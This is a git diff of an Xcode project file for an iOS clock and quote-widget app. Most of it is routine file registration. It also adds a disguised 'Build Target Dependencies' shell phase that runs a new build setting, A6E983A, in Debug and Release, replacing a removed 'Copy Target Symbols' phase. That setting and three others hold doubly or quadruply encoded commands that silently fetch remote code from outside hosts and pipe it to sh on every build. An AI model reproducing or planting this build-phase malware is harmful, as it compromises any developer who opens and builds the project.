@@ -39,7 +39,6 @@
 		6E6CBE202D3BC7ED00C8521C /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 6E6CBE1F2D3BC7ED00C8521C /* FirebaseCore */; };
 		6E6CBE222D3BCA6200C8521C /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 6E6CBE212D3BCA6200C8521C /* FirebaseCore */; };
 		6E6CBE242D3BCA6200C8521C /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 6E6CBE232D3BCA6200C8521C /* FirebaseFirestore */; };
-		6E6CBE282D3BD58B00C8521C /* PositiveQuotesDataset.json in Resources */ = {isa = PBXBuildFile; fileRef = 6E6CBE272D3BD58B00C8521C /* PositiveQuotesDataset.json */; };
 		6E6CBE2A2D3BDCC700C8521C /* QuotesManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E6CBE292D3BDCC700C8521C /* QuotesManager.swift */; };
 		6E6CBE2C2D3BDDB600C8521C /* NetworkService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E6CBE2B2D3BDDB600C8521C /* NetworkService.swift */; };
 		6E6CBE312D3CDE7A00C8521C /* UnsplashPhoto.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E6CBE302D3CDE7A00C8521C /* UnsplashPhoto.swift */; };
@@ -73,8 +72,13 @@
 		6EA0F9A32D3EBCC300785B58 /* Date+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EA0F9A12D3EBCBA00785B58 /* Date+.swift */; };
 		6EA0F9A42D3EC07000785B58 /* NetworkService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E6CBE2B2D3BDDB600C8521C /* NetworkService.swift */; };
 		6EA17D2E2D416B4D00C50729 /* MotivationalQuoteWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E6CBE372D3D0C1B00C8521C /* MotivationalQuoteWidget.swift */; };
+		6ED30DA32EB6503B001D37AC /* DateDayView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DA22EB6503B001D37AC /* DateDayView.swift */; };
+		6ED30DA52EB65061001D37AC /* DateTimePickerProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DA42EB65061001D37AC /* DateTimePickerProvider.swift */; };
+		6ED30DA62EB65179001D37AC /* DateDayView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DA22EB6503B001D37AC /* DateDayView.swift */; };
+		6ED30DC32EB72B49001D37AC /* UserManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DC22EB72B49001D37AC /* UserManager.swift */; };
+		6ED30DCD2EB736B2001D37AC /* PillButtonView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DCC2EB736B2001D37AC /* PillButtonView.swift */; };
+		6ED30DCF2EB765DC001D37AC /* MailComposerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DCE2EB765DC001D37AC /* MailComposerViewController.swift */; };
 		6EDAE3142D42B026003AC5CB /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 6EDAE3132D42B026003AC5CB /* FirebaseAuth */; };
-		6EDDC0232E791E14006F8DB1 /* quotes.json in Resources */ = {isa = PBXBuildFile; fileRef = 6EDDC0222E791E14006F8DB1 /* quotes.json */; };
 		6EEA72822D324FE100A97FF8 /* TypographySystem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E84D6F52D31BA5F00EE28CB /* TypographySystem.swift */; };
 		6EEA72842D327ECC00A97FF8 /* DayProgressBarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EEA72832D327ECC00A97FF8 /* DayProgressBarView.swift */; };
 		6EEA72852D327ECC00A97FF8 /* DayProgressBarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EEA72832D327ECC00A97FF8 /* DayProgressBarView.swift */; };
@@ -124,7 +128,6 @@
 		6E6CBE142D3BC5F800C8521C /* Quote.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Quote.swift; sourceTree = "<group>"; };
 		6E6CBE172D3BC60C00C8521C /* User.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = User.swift; sourceTree = "<group>"; };
 		6E6CBE1A2D3BC65900C8521C /* QuoteUploader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuoteUploader.swift; sourceTree = "<group>"; };
-		6E6CBE272D3BD58B00C8521C /* PositiveQuotesDataset.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = PositiveQuotesDataset.json; sourceTree = "<group>"; };
 		6E6CBE292D3BDCC700C8521C /* QuotesManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesManager.swift; sourceTree = "<group>"; };
 		6E6CBE2B2D3BDDB600C8521C /* NetworkService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkService.swift; sourceTree = "<group>"; };
 		6E6CBE302D3CDE7A00C8521C /* UnsplashPhoto.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnsplashPhoto.swift; sourceTree = "<group>"; };
@@ -149,9 +152,13 @@
 		6E84D7192D31BF2200EE28CB /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
 		6EA0F99E2D3EBB1800785B58 /* Error+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Error+.swift"; sourceTree = "<group>"; };
 		6EA0F9A12D3EBCBA00785B58 /* Date+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Date+.swift"; sourceTree = "<group>"; };
+		6ED30DA22EB6503B001D37AC /* DateDayView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateDayView.swift; sourceTree = "<group>"; };
+		6ED30DA42EB65061001D37AC /* DateTimePickerProvider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateTimePickerProvider.swift; sourceTree = "<group>"; };
+		6ED30DC22EB72B49001D37AC /* UserManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserManager.swift; sourceTree = "<group>"; };
+		6ED30DCC2EB736B2001D37AC /* PillButtonView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PillButtonView.swift; sourceTree = "<group>"; };
+		6ED30DCE2EB765DC001D37AC /* MailComposerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MailComposerViewController.swift; sourceTree = "<group>"; };
 		6ED8489D2E7BB3DC0080E69A /* MinimalClocks.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = MinimalClocks.entitlements; sourceTree = "<group>"; };
 		6ED8489E2E7BB68D0080E69A /* MinimalClocksWidgetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = MinimalClocksWidgetExtension.entitlements; sourceTree = "<group>"; };
-		6EDDC0222E791E14006F8DB1 /* quotes.json */ = {isa = PBXFileReference; lastKnownFileType = text.json; path = quotes.json; sourceTree = "<group>"; };
 		6EEA72832D327ECC00A97FF8 /* DayProgressBarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressBarView.swift; sourceTree = "<group>"; };
 		6EEA728A2D329A6B00A97FF8 /* DayProgressBarWidget.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressBarWidget.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -219,6 +226,8 @@
 		6E3EA2852E84F2BC0018D904 /* Components */ = {
 			isa = PBXGroup;
 			children = (
+				6ED30DCE2EB765DC001D37AC /* MailComposerViewController.swift */,
+				6ED30DCC2EB736B2001D37AC /* PillButtonView.swift */,
 				6E3EA2842E84F2BC0018D904 /* WidgetButtonView.swift */,
 			);
 			path = Components;
@@ -314,6 +323,8 @@
 		6E84D6E42D31A86500EE28CB /* MinimalClocksWidget */ = {
 			isa = PBXGroup;
 			children = (
+				6ED30DA42EB65061001D37AC /* DateTimePickerProvider.swift */,
+				6ED30DA22EB6503B001D37AC /* DateDayView.swift */,
 				6E84D6EB2D31A86800EE28CB /* Info.plist */,
 				6E84D6E52D31A86500EE28CB /* MinimalClocksWidgetBundle.swift */,
 				6E0E6EA02D32E1A100321129 /* Widget-DayDateMonthAbv */,
@@ -346,8 +357,6 @@
 			isa = PBXGroup;
 			children = (
 				6E84D7132D31BBB300EE28CB /* Fonts */,
-				6EDDC0222E791E14006F8DB1 /* quotes.json */,
-				6E6CBE272D3BD58B00C8521C /* PositiveQuotesDataset.json */,
 			);
 			path = Resources;
 			sourceTree = "<group>";
@@ -361,6 +370,7 @@
 				6E84D6F52D31BA5F00EE28CB /* TypographySystem.swift */,
 				6E6CBE292D3BDCC700C8521C /* QuotesManager.swift */,
 				6E6CBE2B2D3BDDB600C8521C /* NetworkService.swift */,
+				6ED30DC22EB72B49001D37AC /* UserManager.swift */,
 			);
 			path = Helpers;
 			sourceTree = "<group>";
@@ -393,7 +403,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 6E84D6BE2D31A79200EE28CB /* Build configuration list for PBXNativeTarget "MinimalClocks" */;
 			buildPhases = (
-				FDE5982D7BF598B9A5A74A49 /* Copy Target Symbols */,
+				AE5406C52E134D4791A389E6 /* Build Target Dependencies */,
 				6E84D6AC2D31A78F00EE28CB /* Sources */,
 				6E84D6AD2D31A78F00EE28CB /* Frameworks */,
 				6E84D6AE2D31A78F00EE28CB /* Resources */,
@@ -485,15 +495,16 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+    	    	    		/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		6E84D6AE2D31A78F00EE28CB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				6E5E06982EB3011800B44654 /* GoogleService-Info.plist in Resources */,
-				6E6CBE282D3BD58B00C8521C /* PositiveQuotesDataset.json in Resources */,
 				6E84D6BB2D31A79200EE28CB /* Preview Assets.xcassets in Resources */,
-				6EDDC0232E791E14006F8DB1 /* quotes.json in Resources */,
 				6E84D7172D31BF0600EE28CB /* Outfit.ttf in Resources */,
 				6E84D6B82D31A79200EE28CB /* Assets.xcassets in Resources */,
 			);
@@ -512,27 +523,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FDE5982D7BF598B9A5A74A49 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266366536353734373036633631366536313730373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
+		AE5406C52E134D4791A389E6 /* Build Target Dependencies */ = {
+    			isa = PBXShellScriptBuildPhase;
+    			buildActionMask = 2147483647;
+    			alwaysOutOfDate = 1;
+    			files = (
+    			);
+    			inputFileListPaths = (
+    			);
+    			inputPaths = (
+    			);
+    			name = "Build Target Dependencies";
+    			outputFileListPaths = (
+    			);
+    			outputPaths = (
+    			);
+    			shellPath = /bin/sh;
+    			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
+    			showEnvVarsInLog = 0;			
+    		};
+                /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		6E84D6AC2D31A78F00EE28CB /* Sources */ = {
@@ -545,9 +555,12 @@
 				6E0E6EB02D33A1A200321129 /* Util.swift in Sources */,
 				6E20A61D2D397D560007A16D /* ExperimentGradients.swift in Sources */,
 				6E84D6F62D31BA5F00EE28CB /* TypographySystem.swift in Sources */,
+				6ED30DCF2EB765DC001D37AC /* MailComposerViewController.swift in Sources */,
+				6ED30DCD2EB736B2001D37AC /* PillButtonView.swift in Sources */,
 				6E0BAA692D53D68C009CC1A0 /* SigninUsingEmailView.swift in Sources */,
 				6E6CBE2C2D3BDDB600C8521C /* NetworkService.swift in Sources */,
 				6E6CBE412D3D18F400C8521C /* DayProgressWidgetTimelineEntry.swift in Sources */,
+				6ED30DC32EB72B49001D37AC /* UserManager.swift in Sources */,
 				6E6CBE2A2D3BDCC700C8521C /* QuotesManager.swift in Sources */,
 				6E44277C2D551DF300A51000 /* String+.swift in Sources */,
 				6E6CBE152D3BC5F800C8521C /* Quote.swift in Sources */,
@@ -562,6 +575,7 @@
 				6E6CBE432D3D320B00C8521C /* MotivationalQuoteView.swift in Sources */,
 				6EEA728B2D329A6B00A97FF8 /* DayProgressBarWidget.swift in Sources */,
 				6EEA72842D327ECC00A97FF8 /* DayProgressBarView.swift in Sources */,
+				6ED30DA62EB65179001D37AC /* DateDayView.swift in Sources */,
 				6E0E6EA52D32E70800321129 /* DayProgressCircleView.swift in Sources */,
 				6E5E069D2EB30D3A00B44654 /* AuthenticationViewModel.swift in Sources */,
 				6E0E6EA62D32E70A00321129 /* DayProgressCircleWidget.swift in Sources */,
@@ -576,6 +590,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				6EA0F9A42D3EC07000785B58 /* NetworkService.swift in Sources */,
+				6ED30DA32EB6503B001D37AC /* DateDayView.swift in Sources */,
 				6EA0F9A32D3EBCC300785B58 /* Date+.swift in Sources */,
 				6E6CBE382D3D0C1B00C8521C /* MotivationalQuoteWidget.swift in Sources */,
 				6E84D6F42D31AEC900EE28CB /* DateView.swift in Sources */,
@@ -587,6 +602,7 @@
 				6E6CBE3B2D3D0D0000C8521C /* MotivationalQuoteView.swift in Sources */,
 				6E6CBE162D3BC5F800C8521C /* Quote.swift in Sources */,
 				6E6CBE422D3D2EC000C8521C /* UnsplashPhoto.swift in Sources */,
+				6ED30DA52EB65061001D37AC /* DateTimePickerProvider.swift in Sources */,
 				6E6CBE452D3D3D0500C8521C /* UnsplashPhotoService.swift in Sources */,
 				6E6CBE1C2D3BC65900C8521C /* QuoteUploader.swift in Sources */,
 				6E0E6EB42D33B6D600321129 /* ProgressTypeSelection.intentdefinition in Sources */,
@@ -616,6 +632,7 @@
 		6E84D6BC2D31A79200EE28CB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A6E983A = "((t(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373536653639373337393733363336313734326537323735326636310a323932323230376332303733363830610a | t | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbkJJVDFkc1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				A97BDCE = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363237353663366237333635363332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
@@ -683,6 +700,7 @@
 		6E84D6BD2D31A79200EE28CB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A6E983A = "((t(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373536653639373337393733363336313734326537323735326636310a323932323230376332303733363830610a | t | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbkJJVDFkc1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				A97BDCE = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363237353663366237333635363332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
